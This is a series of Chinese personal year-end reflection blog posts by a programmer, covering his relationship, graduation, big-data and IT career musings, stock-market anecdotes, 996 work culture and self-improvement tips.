



 


 
 
七月份写过一篇日志，年终总结我们就从下半年开始吧。
这半年来总的来说，档期很满，所有事情基本按照规划都步入正轨，这让我想起来2013年考研时候教毛中特的包松老师在课程快要结束的时候给我们讲到，你对考研成功有强烈的渴求么吗？强烈到像溺水时候渴求空气一样的强烈吗？我有时候想做一件事情非常强烈的想要把它做成，后来，因为这种渴求，我经常能把一些事情做成功。同学们，虽然这样讲有些唯心主义，但是如果你们真的尝试去这样想，这样渴求，就真的离成果不远了。
 
 
 
你若要为你的意义而欢喜，就必须给这个世界以意义。----------歌德
这是一个酥脆香甜外焦里嫩的菜煎饼
咬下第一口，啊，life，之前你都到哪儿去了？
咬下第二口，这个小摊，冰天雪地的坚持到十一点半给同学们卖宵夜，这是怎样的一种职业操守，而且还支持微信支付，满满的感动！
咬下第三口，2016年之前吃饭大学的书都白念了，未曾吃过如此沁人心脾催人泪下之夜宵，没想到，最难翻越的，是习惯！相信世间所有的相遇都是久别重逢！
爱情使所有的人变成雄辩家，这话说得绝对正确。------罗格林

    张老师给学生讲数学的时候我听过，用的还是比较危言耸听的讲法。我初中的数学老师也和张老师差不多漂亮，讲课也挺好，当年我初中的同学们都很喜欢漂亮的女老师，数学都学的不烂，不知道为啥现在的小孩成天补习数学，所以张老师上课的负担也不小。我曾给张老师不屑的讲，初中题目能难到哪里去，你这交初中岂不是大材小用，结果她发了两道题让我做做，我当然不能给陕西吃饭大学丢脸，果断没做对。想当年我中考数学也只扣了三分，对现在题出这么难表示不理解。。。
    张老师  跟我一块的时候不太能说，主要由我负责指点江山，但是只要在微信里面遭遇，说话肯定一套一套的，俨然一副雄辩家的模样，有时候我根本不知道怎么回答她，只好发去。。。，她依据此引经据典又是一顿侃侃而谈，而且每次不同，小生心里佩服的紧呐。
     张老师作为人类灵魂的工程师，工作辛苦，有时候我去接她下班，一起吃饭，她总是胃口大开，从我们认识到现在她吃饭前都说要减肥说她少吃点就行了让我随便点，我总当她是开玩笑，没有当真，所以我吃完就结账拉她走人的时候也不知为什么张老师总是一脸不悦。直到最近张老师认真起来了，我一吃完，她说你等等，我终于明白张老师是在暗示我，谈恋爱，大家要互相迁就，谁吃的快了，就等一下对方，大家共同成长嘛！
我和张老师彼此相识于学雷锋纪念日，一路走来也有将近两年的时间了，今后的日子还长，我们会共同努力，在不同的战线上为实现共产主义奉献力量。
那天坐滴滴的时候有一个非常有意思的师傅，
我看师傅开的是斯柯达明锐，我说这车好！师傅说不要钱的车最好，我问师傅优步和滴滴哪个好？师傅说不要钱的最好，他说他接到过一单滴滴，12000从西安到天津，我忽然想到这个事儿，可以写成剧本儿拍个公路犯罪类型的电影，然后让滴滴打车植入广告一定大卖！我跟师傅一路走一路聊，张老师就在一边傻笑，现在期望司机师傅能开慢点，好让我们几个的欢乐能够得以延续，想到那天小米开年会，老总雷军说，一五年，他们太关注，手机出货量，你整个公司上上下下都背上了沉重的包袱过的一点儿都不欢乐，2016年要把，重心重新关注到手机的电量系统、拍照等细节问题上，带着使命感把这些问题解决好，重新回到为发烧而生的道路上来。
我想我们这个年纪的人多少需要在自由和责任中，做出一个去选择，是追随自己的内心，还是向现实妥协,，选择什么都没有错，不过既然已经选择了，不如让他欢乐一些，你饿不？，我去给你煮碗面

致谢
生活处处有惊喜，希望16年还能继续惊喜下去，感谢这一年来我的努力，张老师的支持，朋友们老师们的关照。
 
后记--
朱光潜在《谈文学》中对于如何做文章讲到：
你不肯用俗滥的语言，自然也就不肯用俗滥的思想感情，你遇事就会朝深一层去想，你的文章就不致落入下乘。现在马上毕业了，马马虎虎的走完了学业生涯，对自己一直要求不高，希望在后续走入社会的过程中，对于自己凡事严格要求，取法为上，仅得为中，取法为中，故为其下，与各位共勉。
 











绪论
2016年的生活有些忙碌，到年底一整年连续的日子成了离散的关键词。2015年这个时候，我还在学校深更半夜因为一个菜煎饼感动的痛哭流涕，一转眼2016年都要过完了。

江湖有江湖的道义，武林有武林规矩，洒家的2016罗列如下：

老张是个好老师
与老张恋爱三年有余，彼此互相包容忍让，共同进步，谁不会闹点小误会呢？毕业那会，正处多事之秋。几年的好哥们，都将去各处远行，心中有些酸楚。彼时又和张老师闹了别扭，一气之下几天没吱声，现再回想起来这是非常不负责任的，在此向老张再次郑重道歉。张老师工作辛苦，你可能要说这年头哪还有容易的活啊。然而作为人类灵魂的工程师，如果是我去教初中数学，面对一个1/2不知道等于0.5的初中生，可能真的忍不住要爆粗口甚至动手削那些熊孩子。而老张呢，虽然威严不减也还是不紧不慢的悉心指导，末了还要应付熊孩子的家长们。
有好几次，我都觉的有点过分。一点多了老张还没吃饭，打电话过去发现张老师依然在和家长沟通学生的情况。一个在老师饭点还冷怂给老师倾诉自己小孩怎么都学不进去不知道咋办的家长可能真的要反思一下，娃学不进去是不是自己的问题。
我们可敬的张老师当然和我不一样，每当出现这样的坑货家长，她都会不厌其烦的帮助她们分析总结，宁可自己饿一会，也会安抚好家长，找到解决问题的办法。人常说，教师是神圣的职业，但教师也是人，老张却用行动诠释了，什么是师者所以传道授业解惑也，不但给学生授业，也给家长解惑。
在此，致敬所有老师！
在此，借用***情书的结尾，吻你万千。

毕业是一件大事
毕业是一件大事，分别也是一件。离校最后的两天宿舍挨个放空，我有些不舍，于是挨个拥抱了所有同学（女）又开车回去游了几回泳，最后送走了大飞，才算离开学校，一脚踏入现实的泥潭。
回想老郑走的时候，山东大汉偷偷掉了眼泪，他说你可别笑话我。“西安这么好，别走了吧”，我告诉他。可他听了之后还是头也不回的去检票了，还撂下一句：你们回吧。林总和老王走的时候就没这么多痛苦。因为以后和老王聚的时候还多，结果到现在也没聚过一次。林总一想到深圳离卅城就两站路，就开心的浑身热血沸腾，一溜烟上了头班616拍马而去。黄兄要南下蜀地，后来多次沟通工作上对IT个大领域的发展畅想，黄兄想法见地之深刻令人耳目一新，这年头敢唱衰大数据的人不多，黄兄算是有理有据的一个。
抱道不曲，拥书自雄，与诸位同学共勉。


大数据时代的思维转变
毕业后没想到阴差阳错的进入了大数据处理领域，才发现在视觉领域浸泡许久，思维和大数据处理上截然不同。视觉上的处理要求精确，单机高效，并行，更多是因果关系，图像中出现了人，因此有人脸，从而有人脸识别，从而有表情识别。而大数据条件下更多是要求关联关系，只要发现了两个现象之间存在显著的相关性，就可以创造巨大的经济或者社会效应，比如Google通过追踪大量用户搜索流感字样的人群位置，做出了流感的趋势预测。

唱衰大数据
Susan langer 在《哲学新视野》一书中说：某些观念有时候会以惊人的力量给知识状况带来巨大的冲击。由于这些观念能一下子解决许多问题，所以，它们似乎将有希望解决所有基本问题，澄清所有不明了的疑点。每个人都想迅速的抓住它们，作为进入某种新实证科学的法宝，作为可以用来构建一个综合分析体系的概念轴心。这种‘宏大概念’突然流行起来，一时间把几乎所有的东西都挤到了一边。
大数据时代，大数据这一手段俨然成为了一种万能工具，我们今天在这里就是要唱衰大数据，因为越是万能的，就越是空洞的。
大数据的核心是预测，如果不能进行预测，仅仅进行简单的数据统计分析，那么和传统的领域我认为是没有区分开的，从事这样的行业价值不大，当今大数据框架之成熟解决方案之完备，完全可以让一个没什么计算机经验的高中生经过几个月的培训就接手各种修改配置的部署工作中去，CDH，zookeeper，hue等等管理框架又都提供了图形化管理的界面，如今各大开源社区的贡献已经让尽可能多的人成为了大数据行业中的价值制造者，那么从事大数据行业的人还有什么可以深入发掘的点呢？
大数据人才大致可以分为以下三个方向：

偏重基建与架构的大数据架构方向。
偏重建模与分析的大数据分析方向。
偏重应用实现的大数据开发方向。

机遇与挑战似乎一直存在，你能找到他们么？

老王和他的IT界朋友们
工作不多时来到北京，借此有机会看望了IT界的名企大牛同学们（时间有限BAT,GOOGLE等还没走完），虽然都身在新闻联播的帝都里，幸福像花儿一样，然而漂泊本无根，几年过去了，大家都没怎么变化，这又让我想起一句诗：人面不知何处去，桃花依旧笑春风，诸位累了就回西安吧。




逃离北上广，我们有情怀的雷总在西安迎接大家，有留迹，让故事留在他发生的地方.


帅不帅，留给别人去评判，反正天下我最帅！
2016年是我准备开始运营《老王和他的IT界朋友们》这个品牌的开局之年，感谢各位亲朋好友的支持，公众号至今为止以有208位粉丝，他们不属于IT界，就一定是IT界的朋友。书上说做人得要有：高远意志，平宽心情。我们这个小圈子一定会竭尽全力带领各位实现目标，剖析自己，送上更多的人文关怀。

后记
2016年已经离我们远去，世事尽管有些未尽人意，您可千万别灰心丧志。挫折如火，劫难如焚；火能焚木为灰，却能炼铁成钢！
最后祝大家新年快乐



欢迎关注公众号：老王和他的IT界朋友们






















2017年钟声敲响的时候，人们总是习惯于性质勃勃地写下一张全年的to do list：例如读完800本书，买个大房子等等。立志之后，就陷入到忙忙碌碌的新一年中，上班扎进电脑和手机，下班一头扎进被子，直到猛一抬头发现2017年只剩几天。。。

十八般武艺 VS 亢龙有悔
矛锤弓弩铳，鞭简剑链挝，斧钺并戈戟，牌棒与枪杈
古语有云：有志者立常智，无智者常立志。随着现代社会的迅速变化，立常志变得几乎不可能，更多的情况是你的理想需要随着现实情况的变化而做适当的调整。但即便如此，我还是认为需要一个相对恒定的理想。不忘初心，是整个国家，社会对于回归纯粹生活的热切期望。
工作一年半以来，由于单位没有互联网，手机俨然成为了我躯体的又一器官。当我发现手机严重影响 我的专注度和思维能力已经 为时过晚。远离手机的时间，大脑通过冥想可以将一些看似没有太多关联的事情联系起来。所以当我和任务独处的时候我能感觉到和整个宇宙都在产生联系，但是当手机加入，就只有我和手机了。 
自媒体的迅速发展，既容易造成注意力的集中，也容易造成注意力的消解，使人们对需要严肃对待的事情越来越缺乏耐心，面对铺天盖地的信息，往往需要耗费大量时间甄选有用信息 ，本来是打开手机搜索一个问题，由于顺道开了微信，刷了一圈朋友圈八卦，又顺道看了两篇公众号文章，而忘了自己原本要打开手机的目的，长此以往根本没法集中注意力，干什么都不专心，做什么都delay，当今社会犯错成本太高，我们还是需要小心翼翼，千万不要养成时不时看手机的毛病而误了大事。
两弹一星元勋科学家钱学森出身书香门第，他不但学贯中西更是精通琴棋书画，1935年，24岁的钱学森甚至还发表过一篇题为《音乐与音乐的内容》的论文。看来天龙八部中聪辩先生苏星河精通琴棋书画，却不擅长武学，因花太多时间于杂学之上，并未学会逍遥派太多高深的功夫，他有点像我现在的状态，在技术上缺乏一个focus 的点，郭靖大侠当年将一招亢龙有悔使到极致照样威震武林，当然他也可能还是天赋有限。我也天赋有限，工作生活中还是要保持专注度，远离手机，保持纯粹的追求，也许总有一天，自己也能十八般武艺样样精通，成为一代全栈程序宗师。

 天下攘攘皆为利往
以下一个小节完全转载自，安晓辉《 程序视界》

很多开发者追逐 AI ，也是从这点出发，为了自己更好的未来。但实际上，趋势并不属于每个人。它往往属于那些已经为这个趋势做了很多年准备的人。
你必须知道的是，现在 AI 趋势里风生水起的专家、科学家、公司，哪个不是之前已经在相关领域做了很多年的研究？
如果你只是看到趋势就盲目扑过去，往往沦为跟风，甚至会跟丢，跟来跟去找不到自己的位置。所以，如果你决定要跟，也要了解怎样去跟。
人工智能开发的四种类别

最后，提醒一下，并不是每个程序员都要追逐人工智能软件开发这个浪潮。软件开发的方向很多，应用场景也很多，你有非常大的可选择余地——只要你能成为你所处领域的局部头部，你就会拥有很多机会。而如果缺乏成为头部的思维、能力和行动，不论去追赶什么浪潮，结果都只能是望洋兴叹。

参考这篇安大神的文章分析，我可以有一个简单的判断，从现在做起还不算晚。 
http://mp.weixin.qq.com/s/TdG3ML195g55hD9a9UuxcQ 
(以上内容转自上述链接)

我一直追寻着你心情的足迹
张老师的小学教师生涯并不是一副歌舞升平的盛世景象，她有时候甚至问我：自己是不是适合教师这个职业。家长到处范二，练习册丢了问老师，作业布置的啥问老师，恨不得把老师当成7*24小时不间断服务的人肉机器人，问的时候还不加敬称，你你你的呼来唤去。我看了心里都很不爽，张老师还是不卑不亢的耐心回答，就评这一点小张就应该获得优秀教师勋章。
国家说要提高基层教师工资待遇，喊了很久，张老师也没涨工资。大学教授一个月1w7带两三个研究生天天给自己报销发票有几个真正推进了我国现代化进程的进步？小学幼儿园初高中老师一个月几大千一人带80多个祖国的花朵，拿着卖白菜 的钱操着卖白粉的心。谁手中掌握着祖国的未来？多劳多得按劳分配也应该给她们涨涨工资。
记得有一次和高指导聊天龙八部，发现金庸竟然在新版改了结局，知乎上有人说，更相信王语嫣和段誉仍然是一对。后来长大后便慢慢醒悟爱情的意义。明白了金老先生的深意。其实木婉清刚出场那时，已经折服了多少人的心，他和段誉本是良偶，于是王语嫣与我，从神仙姐姐，变成了岳灵珊、变成了周芷若。
和张老师的爱情长跑将近1400多天，我们已经有了明确的人生规划，在人生大事上基本达成了共识，爱情在我们两个人的生活当中产生了微妙的变化，好像慢慢的在向柴米油盐等琐碎的事情上迁移，张老师批评我说热恋还没完，怎么就要开始准备结婚了。说起来万分惭愧，是这一年来我因为工作的原因聚少离多，给她的惊喜太少了吧。
特别感谢小张老师，她是一名优秀的产品经理，经常能敏锐且毫不客气的指出我的不足，更难得的是她胃口很好，哈哈

任何事情要做好且做爽，必然是内驱的
2015年的关键词：少说多做 
http://blog.csdn.net/wangyaninglm/article/details/50640972 
2016年的关键词：努力，奋斗 
http://blog.csdn.net/wangyaninglm/article/details/53959333 
2017年中的关键词：让我们一起为梦想窒息！ 
http://blog.csdn.net/wangyaninglm/article/details/74612482
过去的时间我基本保持 ，每半年更新一篇总结过去，展望未来的文章，2016年底我希望自己能够成为大数据全栈工程师，还顺道唱衰了一下大数据觉得大数据什么的都是使用开源的产品，一年过去发现，好家伙用开源产品也得知道怎么用数以万计的api呀，hadoop生态圈十几二十个产品真不是盖的。和圈内专家聊了两句就露馅，人家说，您这就不叫大数据研发，充其量就是使用开源组件—-而已！
所以这半年比较尴尬，甚至没有一个可以写到简历上用来show 的项目。代码没写过多少，淡是越扯越好了。 
想起csdn专家群里一个专家总结最近面试人的经历，大多数是：一问三不会，开口十几k 
我呢？开不了口。。。
总结总是有喜有悲的，在单位，吃了个饭，睡了个觉，出了个差，半年过去了。这些时日我总发现自己穷的很，不单单是物质层面上的，更是精神上的穷。
造成这种身心惧穷的根本原因是基本上把钱看的比什么都重要，做事情的时候我会不自觉的去衡量事情的金钱价值，而真正应该 有的态度是首先把事情做好，顺便赚钱。至少冯仑说李嘉诚是这么认为的。
工作说完了，咱们再来聊聊人生有何意义？胡适先生说，科学家是为求真理。庄子虽有“吾生也有涯，而知也无涯，殆已”的话头，但是我们还是要向上做去，得一分就是一分，一寸就是一寸，可以有阿基米德氏发现浮力时叫Eureka   的快活。有了这种精神，做人就不会失望。所以人生的意味，全靠你自己的工作；你要它圆就圆，方就方，是有意味；因为真理无穷，趣味无穷，进步快活也无穷。
记得前段时候有一篇文章说第一批九零后已经秃了，当然没有人能躲过生活，只不过现在轮到90后，罗曼罗兰曾说过，世界上只有一种真正的英雄主义，那就是在认清生活的真相后依然热爱生活。
共勉！

特别鸣谢

小张老师
胡适先生
《人人都是产品经理》
《黑客与画家》
安晓辉 《程序视界》


All Rights Reservered

注： 
在大型组织内部，有一个专门的术语描述这种跟随大多数人的选择的做法，叫做“业界最佳实践”。 









文章大纲程序员的美德优秀是一种习惯自我激励相信自己的直觉，思考的更深入一些结构化，工程化的思维忙碌的一年韭菜的自我修养？人工智能 之我见那些年我写过的总结

魏超 说 他很期待老王我的年终总结，我有点激动的不能自已，而且骤然发现2018年是我踏入IT 的第十个年头了，值得大书特书。于是决定将这篇年中总结分成两个部分，在2018年年底，和2019年年初分别发布。上篇主要回顾和总结，下篇用来畅想未来。

程序员的美德
编程珠玑上说，程序员有三大美德：

对数值敏感
实验的欲望
良好的数学功底

从我的IT十年路来看，关于如何成为一名优秀的程序员，我其实可以充当反面教材，看的书不少，写的代码太少。随着投身行业的时间逐渐增长，遇到的bug，身边的大牛，总有一些方面尤其感触良多，印象深刻。下面分享几个今年的感悟。

优秀是一种习惯
自我激励
相信自己的直觉，思考的更深入一些
结构化，工程化的思维


优秀是一种习惯

最早写博客是上了大学以后，每个人内在都有一个渴望被别人了解的社会性需求。我开始是在qq 空间上面写，总是一些剖析自己，畅想未来的套路。后来发现自己其实没什么好剖析的，还是剖析剖析IT相关的技术细节。就开始混迹csdn，那时候论坛还有很多人。
一些具体的程序设计问题，配置问题，在坛子里会有一些大牛悉心的回复。碰的坑多了，久而久之就成了专家。久病成医就是这个道理。但是其实，正规的，工程化的套路不应该是这种样子，拿到一个第三方库，或者插件，我们应该先看文档，然后才下手去做，去实践。
然而国内IT的氛围比较紧张，项目经理经常从需求那边拿到的反馈就是三个字：明天要。 谁有心情仔细钻研这些个开源组件的来龙去脉呢，其实前几天阿里开源的组件圣诞节期间自爆彩蛋不就是这个事情的最好说明么。
所以我认为，优秀的程序员会有一种习惯，总是未雨绸缪的

自我激励
试图引经据典，找到一些前进的方向。
如果翻看我曾经写过的文章，你就会发现我特别喜欢引用名人的话来证明自己的观点，并以此找到一些前进的方向，我总是容易陷入阶段性的迷茫中，迷失了自我和目标
还记得，得到第一个真正的篮球时，我还是个孩子。
我喜欢它在手中的感觉，对它一见倾心。我甚至舍不得拍它或用它，因为不愿破坏那些鹅卵石般的皮革颗粒，还有那些完美的凹槽。
我不想毁了那种奇妙的感觉。 

我也喜欢它发出的声响，那种在硬木地板上反弹发出的“砰、砰、砰”。清脆，清晰，易于预测。
那是生命之声，光芒之声。 这正是我热爱篮球、热爱比赛的一部分原因，也是我篮球之道的核心与根基。
因为它们，我才能经受我所能经受的一切，倾注我所能倾注的所有，探索我所能探索的全部。

一切都源于孩童时期，第一次听到那让我心醉神迷的“砰，砰，砰”。
                                                 							----《曼巴精神：科比自传》

我们公司有个分析师，是个在美国的印度人，他说当他看到我的流川枫头像，想起来他小时候也是看slamdunk漫画和机器猫龙珠长大的。也知道《直到世界尽头》这首歌，我想说的是你看Kobe自传里面写的这些个场景，难道Kobe也是看了灌篮高手听了WANDS的歌了么？
原来每个人小时候的成长环境都或多或少的一样。而且那些放之四海而皆准的至理名言和人生哲理，既然对别人都有用，那对我也一定可以起作用。

相信自己的直觉，思考的更深入一些
前段时间工作上有个项目，需求收集的比较模糊，开完会之后发邮件，所有人的意见都指向往简单了去做。但是我心里觉的实际上肯定没有这么简单。但是还是为了避免不必要的麻烦，最后沟通总结邮件时候也是按照简单的方式做了总结。
果不其然晚上就被领导们教育了一番。这种总结性的邮件，如果我没有更深入的进行一些思考，那么其他对接的方面怎么可能尽量理解的清楚呢。
所以凡事相信自己的直觉，思考的更深入一些，举个《编程珠玑第二版》的例子来说
什么是用户的真正需求：
一个运筹学者接到任务，设计末座大楼的电梯调度策略，使乘客等待的时间最短，在走访了这座大楼之后，他认识到雇主真正想要解决的问题是，尽量减少乘客的不适（ 乘客不喜欢等电梯）。他这样解决问题：在每部电梯附近装上几面镜子。乘客在等电梯时候，可以自我欣赏一下，对电梯速度的抱怨大幅减少了。
他思考的更进一步，发现了用户的真正需求

结构化，工程化的思维
Oracle 如何处理一个 bug


开始处理一个新的 bug 。


花两周的时间试图理解 20 个不同的 flag ，这些 flag 以神秘的方式相互交互，导致这个困境。


再添加一个 flag 来处理新的特殊场景。添加几行代码来检查此 flag ，并解决有问题的情况，规避该 bug 。


将更改提交到包含大约100-200台服务器的测试服务器集群，这些服务器将编译代码，构建新的 Oracle 数据库，并以分布式方式运行数百万个测试。


回家。第二天来上班，继续处理别的 bug 。测试可能需要20-30个小时才能完成。


再回家。再来上班，检查你的集群测试结果。顺利的话，会有大约100个失败的测试。倒霉的话，将有大约1000个失败的测试。随机选择一些测试并试图搞清楚你的假设出了什么问题。或许还需要考虑10多个 flag 才能真正理解 bug 的本质。


再添加一些 flag 以尝试解决问题。再次提交更改以进行测试。再等20-30个小时。


来来回回重复两周，直到你得到了将这些 flag 组合起来的“神秘咒语”。


终有一天，你会成功，不再出现测试失败。


为你的新更改添加100多个测试，以确保下一个不幸接触这段新代码的开发人员永远不会破坏你的修复。


提交最后一轮测试的成果。然后提交以供审核。审查本身可能还需要2周到2个月。所以接下来继续去处理下一个 bug 。


在2周到2个月之后，一切已就绪，代码将最终合并到主分支中。


以上是oracle 处理一个 bug 的过程，据说我最喜欢的数据的库Oracle 12c 有2500w 行c 语言代码。你写过的最大的个人代码库有多少行代码？
所以，当解决复杂问题的时候，个人单打独斗的时代已经离我们远去了。我们需要的是工程化，结构化的思维模式，这样才能面对风云变幻的国际形势立于不败之地。
忙碌的一年




今年是非常忙碌的一年，上半年年还没过完，就被单位忽悠到北京保卫祖国和人民，连续两年我的正月十五都是在北京过的。反正去年年底已经铁了心的要走，索性最后送佛送到西，也算是不留遗憾。怎奈身体的健康下降了太多，人老先老腿。这一点在我身上体现的特别明显。作为一个程序员，一天中有80%时间在电脑跟前坐着，腿部肌肉退化萎缩的厉害。大学时候我可以跑1500米全校第一，没觉得什么。现在只要跑两步就觉的腿很沉。
但是，雪莱说：过去属于死神，未来属于自己。身体容不得半点马虎。我依旧坚信，每天锻炼三十分，健康工作三十年。
年初的时候csdn 博客的访问才130万，今年一年又增加了40万，虽然只写了20多篇博客，还有一些是厚着脸问魏少、黄兄要的（此处特别鸣谢）。今年的技术上，似乎相关spark 和python 以及oracle 多一些。NLP也算是在字词，可视化的初步探索上有了自己的一些积累。后面希望自己将NLP这些东西融会贯通起来。
回首往事，一年的时光荏苒，当我翻看朋友圈，很难想象，年初，我还在北京常驻进行大数据集群的运维，做着不知疲倦的数据搬运工，年底我已经在知盛深入健康保险行业的大数据分析了。
底下这张照片我很喜欢，这是2017年底，赶头一班高铁回家，在高铁上拍到的，北京总是很早的时候就开始堵车

回首这十年，每一年的年终总结，我似乎都会加上忙碌两字。忙可以，但是碌碌无为就不太好了。很多时候，我一直明白，生活在周而复始的阶段性颓废和奋进中挣扎徘徊，就好像北京每天早上都堵车，我们一定要让生活非得这样么？
能不能买个直升机上下班

韭菜的自我修养？
2018年初，准备结婚，我妈叫我把手里的股票基金清空，我看着我逐渐从3000点建仓起来的大概15%的收益，我说等等。我还能多赚点。我和一个老股民有了争论（我妈），她说，瓜娃，落袋为安。
后来，到现在2018年底，我还没卖，抄底还抄在半山腰，我说，真正成了韭菜，真是难以自拔。
有一天无意中看到蚂蚁财富号上不知道谁写的特别有道理的一段话：
牛市之中，不管是买方还是卖方都是你的战友。
而熊市之中，不管是买方还是卖方，都是你的敌人。
什么意思呢？或者说这是为什么呢？
很多人不理解为什么老交易员经常讲：牛市胆子要大，熊市要懂的寂寞，刀枪入库，马放南山。
因为，在牛市里，不管是买方还是卖方，双方都是实质性赚钱。
在熊市里，不管买方还是卖方，二者都是实质性亏钱。

人工智能 之我见
AI时代该学什么？
人工智能时代，程式化的、重复性的、仅靠记忆与练习就可以掌握的技能将是最没有价值的技能，几乎一定可以由机器来完成；反之，那些最能体现人的综合素质的技能，例如，人对于复杂系统的综合分析、决策能力，对于艺术和文化的审美能力和创造性思维，由生活经验及文化熏陶产生的直觉、常识，基于人自身的情感（爱、恨、热情、冷漠等）与他人互动的能力……这些是人工智能时代最有价值，最值得培养、学习的技能。而且，这些技能中，大多数都是因人而异，需要“定制化”教育或培养，不可能从传统的“批量”教育中获取。

那些年我写过的总结
10年IT路，我从大约10年左右开始写年终总结，那时候的文章太矫情，而且透露出与年龄不相符的沉闷，一路走来，我改变了很多，但有一点没有改变，那就是前进的动力。
2013年年中的关键词：生活

我所理解的生活

2013年年底的关键词：温和的坚持，并且傻笑

草稿2013
As time goes by

2014年年中的关键词：世间的事大抵如此

吴家坟女子专修学院郭杜校区计算机分院的学年总结

2015年年中的关键词：earning my living，burning my soul

年少成名的我并没有放弃自己，谁敢说她\他文章比我写的好？！，不服来战！

2015年的关键词：少说多做

2016依然会给我惊喜，谢谢

2016年中的关键词：毕业

从前有一个程序员，成天写代码，后来，他屎了。。。

2016年的关键词：努力，奋斗

2016年简直一晃而过

2017年中的关键词：让我们一起为梦想窒息！

我要用生锈的机关枪击穿现在

同期工作一年后对考研的回顾：

考试，一种严格的水平鉴定方法。

2017年底的关键词：不断前进，永不回头

2017,业界最佳实践

2018年农历新年：只要思想不滑坡，办法总比困难多！

因为我梦见了热情的梦

2018年 研究所离职：费解

IT从业者国企生存指南

2018年 年中：人生大事

结婚是一件人生大事











文章大纲视线所及只剩生活挣钱迷茫之后10条建议那些年我写过的总结

2018 初入IT十年（上）----成为一名优秀的程序员
初入IT十年下，本来打算在2019年初写完，结果拖到了现在。在程序员节之前，发出来，权当是年终加半年总结。

视线所及只剩生活
996 icu 事件已然过去一段时间，那时候
周鸿祎毫不忌讳地说，在中国，工资只能解决糊口问题。你想买房，就要拿到公司股份，而不是指望996。“在座的哪位如果能够真正做到快乐工作，平衡好家庭和工作的关系，我就叫他一声大爷。
我深以为然，穷是21世纪的顽疾，不单单是金钱，更是时间上的。
凤姐在微博上曾逻辑严密的给996 的人算过一笔账，如果加上上下班来回，执行996工作制的人回家只剩睡觉的时间了，资本家福报理论的司马昭之心昭然若揭。

挣钱
说几个这些年来关于挣钱的感受。在上一篇文章里面讲到: 韭菜的自我修养？
今天再补充几个。
看懂了这个，你再去炒股；股市暴跌，为啥散户炒股票总赔钱？李永乐老师用数学告诉你！


李永乐老师的两个建议：
1.把自己的心态调整好，把自己的时间和钱用在更有意义的事情上
2.如果一定要买股票的话，请买那些基本面良好有发展前景的股票，慎重购买题材股，因为题材股上有很多的庄稼，他们会通过一定的策略让你一直输钱。
我的建议和经验：
1.股票反着买，别墅靠大海
中国的资本市场也在逐渐转向价值投资，那么如果我们选择做长线，巴菲特曾说：“别人贪婪时候我们要恐惧，别人恐惧的时候我们贪婪。”。
我来简单说两个买入点：
第一个8月份，中美贸易战打的不可开交，大盘一度只有2700，那时候同学们分分钟都在朋友圈说要奔着2400去了，你敢买么？
第二个10月1国庆过节前，因为大部分人不敢持币过节，所以出货上证下探到了2900低点，过节后行情会变好么，你敢买么？
如果在第一个点买入，过了两个月就有7%的收益！
如果在第二个点买入，国庆过完的周末就有将近3%的收益！

2.逐渐积累价值投资的一般性规律
比如 部分公司出年报前会涨一波，叫金三银四。还有五穷六绝七翻身，金九银十等等，大势所趋，世间的事大抵如此。

迷茫之后
人到中年，不免迷茫，其实归根结底一句话：身体是自己的，公司是别人的。
下面给大家介绍一个最近看到的瞭望智库和吴晓波的专访实录，很有启发:
瞭望智库：
前阵子，中兴有位员工因裁员就含愤坠楼，这背后反映了什么行业问题？
吴晓波：
中国每天都有很多公司在裁员，很多人被减薪或者失业。
之所以受到如此高度关注，无非因为发生在中兴。
中兴这次事件体现了这些通讯公司职场竞争的残酷性。
举个例子，华为招工有两项特别要求：第一个，必须要工作5年以上；第二个，40岁就可以退休。
这说明它对人才的挤压性使用是别的行业所罕见的。
现在，中国的BAT员工平均年龄是27岁。40岁左右，除非你是高管，如果只是普通员工，你很可能要被淘汰。而且，很多公司有10%的强制性末位淘汰。
实际上，这是中国制造业之所以能够保证野蛮战斗力的原因之一。中兴这件事情并不能代表什么东西，只能提醒中兴公司：你们需要有一支心理老师队伍，或者一个专门的部门来帮助大家缓和心理上的问题。
悲剧会不会重演？
瞭望智库：
我的一些互联网行业的朋友看到这个消息感到非常不安——现在处于互联网行业飞速发展的阶段，我们可以拿着高薪，每天都会有猎头hr找我们跳槽。
但是，等我们步入中年将何去何从呢？悲剧会不会重演？
吴晓波：
15年前，我在一个报社当副总编，工资是两万块人民币。现在全中国最好的报社的副总编工资也就是两万人民币。这15年来，中国的M2已经从12万亿左右增加到160万亿。那么，你怎么没看到报社副总编跳楼呢？
而且，这15年，这些互联网人抢了我们报社的很多生意，对不对？所以，为什么报社的人不跳楼，而互联网的人要跳楼？这毫无道理。
每个人职业生涯中都可能出现波动期，需要我们做一个认真的选择。十年后，这个问题可能会越来越严峻。
现在有人工智能，它可能会替代很多东西，可能很多“码农”甚至陆家嘴的很多证券分析师、精算师、会计师都会失业。那么，陆家嘴每天都有人跳楼？不会。
人总会在绝境中给自己找一条路走下去的，大家要做好心理建设才是最关键的。

10条建议
1. Wake Early
2. Daily Exercise
3. Review and Rewrite your goals
4. Read and Listen to Motivational Material
5. Visualize the Day Ahead
6. Write a “To-do” List
7. Check the News Headlines
8. Take a Multivitamin
9. Tidy up
10. Take time to look good

那些年我写过的总结
10年IT路，我从大约10年左右开始写年终总结，那时候的文章太矫情，而且透露出与年龄不相符的沉闷，一路走来，我改变了很多，但有一点没有改变，那就是前进的动力。
2013年年中的关键词：生活

我所理解的生活

2013年年底的关键词：温和的坚持，并且傻笑

草稿2013
As time goes by

2014年年中的关键词：世间的事大抵如此

吴家坟女子专修学院郭杜校区计算机分院的学年总结

2015年年中的关键词：earning my living，burning my soul

年少成名的我并没有放弃自己，谁敢说她\他文章比我写的好？！，不服来战！

2015年的关键词：少说多做

2016依然会给我惊喜，谢谢

2016年中的关键词：毕业

从前有一个程序员，成天写代码，后来，他屎了。。。

2016年的关键词：努力，奋斗

2016年简直一晃而过

2017年中的关键词：让我们一起为梦想窒息！

我要用生锈的机关枪击穿现在

同期工作一年后对考研的回顾：

考试，一种严格的水平鉴定方法。

2017年底的关键词：不断前进，永不回头

2017,业界最佳实践

2018年农历新年：只要思想不滑坡，办法总比困难多！

因为我梦见了热情的梦

2018年 研究所离职：费解

IT从业者国企生存指南

2018年 年中：人生大事

结婚是一件人生大事

2018年底：成为一名优秀的程序员

2018 初入IT十年（上）----成为一名优秀的程序员











文章大纲看图说话----序西安公司杭州总部上海BMS 学习出差路上阶段性成绩技术积累身体健康消费支出那些年我写过的总结

看图说话----序
